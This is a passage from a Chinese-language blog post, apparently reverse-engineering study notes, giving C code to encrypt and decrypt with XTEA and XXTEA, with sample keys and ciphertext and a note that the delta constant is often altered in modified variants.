i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 原始明文(小端序十六进制)</span></span><br><span class="line">    <span class="type">uint32_t</span> plaintext[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x67616C66</span>, <span class="number">0x3332317B</span>, <span class="number">0x37363534</span>, <span class="number">0x30303938</span>,</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x7D353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原始密钥(小端序十六进制)</span></span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> num_rounds = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原始明文:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08X &quot;</span>, plaintext[i]);</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对每个64位块进行加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> block[<span class="number">2</span>] = &#123; plaintext[i], plaintext[i + <span class="number">1</span>] &#125;;</span><br><span class="line">        encipher(num_rounds, block, key);</span><br><span class="line">        plaintext[i] = block[<span class="number">0</span>];</span><br><span class="line">        plaintext[i + <span class="number">1</span>] = block[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n加密后的密文:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08X &quot;</span>, plaintext[i]);</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x9E3779B9</span>, sum = delta * num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>] = &#123; <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span> &#125;; <span class="comment">// 密钥</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r = <span class="number">32</span>; <span class="comment">// 轮数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 密文分组</span></span><br><span class="line">    <span class="type">uint32_t</span> ciphertext[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">0x37DB3CE9</span>, <span class="number">0x6C07F159</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0xE1893135</span>, <span class="number">0x57978EA8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0xB159F7E6</span>, <span class="number">0x439F8389</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x988499C3</span>, <span class="number">0x9765BBF9</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123; ciphertext[i][<span class="number">0</span>], ciphertext[i][<span class="number">1</span>] &#125;;</span><br><span class="line">        decipher(r, v, key);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;组 %d: 0x%08X 0x%08X\n&quot;</span>, i + <span class="number">1</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将解密后的32位整数转换为字节序列（小端序）以显示为字符串</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>* bytes = (<span class="type">unsigned</span> <span class="type">char</span>*)v;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        作为字节序列: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, bytes[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n        可能作为字符串: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bytes[j] &gt;= <span class="number">32</span> &amp;&amp; bytes[j] &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, bytes[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>XTEA（eXtended TEA）是 TEA 算法的改进版，由 David Wheeler 和 Roger Needham 于 1997 年提出，主要修复了 TEA 的相关密钥攻击漏洞，以 64 位为数据块、128 位为密钥，通过 32 轮包含加 &#x2F; 减、循环移位和异或的操作实现加密解密，因轻量易实现、对资源需求低，常用于嵌入式设备等场景。</p>
<h3 id="最常魔改点-1"><a href="#最常魔改点-1" class="headerlink" title="最常魔改点"></a>最常魔改点</h3><p><code>delta</code>是魔数0x9E3779B9   这个数据经常被换。</p>
<p>加密核心</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>; <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]); <span class="comment">// 对左半块操作</span></span><br><span class="line">        sum += delta; <span class="comment">// 更新“轮常量”</span></span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]); <span class="comment">// 对右半块操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; <span class="comment">// 加密后的左半块</span></span><br><span class="line">    v[<span class="number">1</span>] = v1; <span class="comment">// 加密后的右半块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密的换就反过来进行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x9E3779B9</span>, sum = delta * num_rounds; <span class="comment">// 初始化sum为最终值</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]); <span class="comment">// 逆向操作右半块</span></span><br><span class="line">        sum -= delta; <span class="comment">// 逆向更新sum</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]); <span class="comment">// 逆向操作左半块</span></span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><h3 id="加密-1"><a href="#加密-1" class="headerlink" title="加密"></a>加密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x67616C66</span>, <span class="number">0x3332317B</span>, <span class="number">0x37363534</span>, <span class="number">0x30303938</span>,</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x7D353433</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123; <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span> &#125;;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原始明文（小端序十六进制）:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    btea(v, n, k);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据（十六进制）:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解密-2"><a href="#解密-2" class="headerlink" title="解密"></a>解密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;            <span class="comment">/* Coding Part */</span></span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;    <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 密文数据 (小端序十六进制)</span></span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x3E95DFCB</span>, <span class="number">0x608F99DA</span>, <span class="number">0x40ABC551</span>, <span class="number">0x941490C5</span>,</span><br><span class="line">        <span class="number">0x7985C1B9</span>, <span class="number">0x20FC9B0A</span>, <span class="number">0x23C095EB</span>, <span class="number">0x62EFB4EE</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 密钥 (小端序十六进制)</span></span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = <span class="number">8</span>; <span class="comment">// 密文长度为8个32位无符号整数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文数据:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, v[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密</span></span><br><span class="line">    btea(v, -n, k);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n解密后的数据:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, v[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将解密后的数据解释为字符</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n解密后的字符串:\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* bytes = (<span class="type">unsigned</span> <span class="type">char</span>*)v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n * <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bytes[i] &gt;= <span class="number">32</span> &amp;&amp; bytes[i] &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, bytes[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\\x%02X&quot;</span>, bytes[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>XXTEA（Corrected Block TEA）是 XTEA 算法的优化升级版，专为解决 XTEA 对数据块长度的限制而生，能以 32 位无符号整数为基本单位，对任意长度的数据进行加密解密；它延续了轻量级特性，仅依赖基础算术与位运算，代码量少、资源占用低，同时优化了轮函数设计，增强抗攻击能力，广泛用于嵌入式设备、物联网终端、小型通信协议等对算力和存储要求严苛的场景。</p>
<h3 id="最常魔改点-2"><a href="#最常魔改点-2" class="headerlink" title="最常魔改点"></a>最常魔改点</h3><p>define DELTA 0x9e3779b9  这个数据经常被换。</p>
<p>加密原理</p>
<ul>
<li><strong>输入</strong>：明文数组 <code>v</code>（8个32位整数）、数组长度 <code>n=8</code>、密钥 <code>k</code>（4个32位整数）。</li>
<li><strong>关键步骤</strong>：<ul>
<li>计算轮数 <code>rounds = 6 + 52 / n</code>（确保充分混淆）。</li>
<li>初始化 <code>sum = 0</code>，<code>z = v[n-1]</code>。</li>
<li>多轮循环（每轮 <code>sum += DELTA</code>（0x9e3779b9））：<ul>
<li>计算 <code>e = (sum &gt;&gt; 2) &amp; 3</code>（动态选择密钥索引）。</li>
<li>遍历数组（除最后一个元素），使用 <code>MX</code> 函数更新每个 <code>v[p]</code>：<code>v[p] += MX</code>（<code>MX</code> 混合 <code>y</code>（下一个元素）、<code>z</code>（前一个元素）、密钥和 <code>sum</code>）。</li>
<li>更新最后一个元素 <code>v[n-1] += MX</code>（使用 <code>y = v[0]</code>）。</li>
</ul>
</li>
</ul>
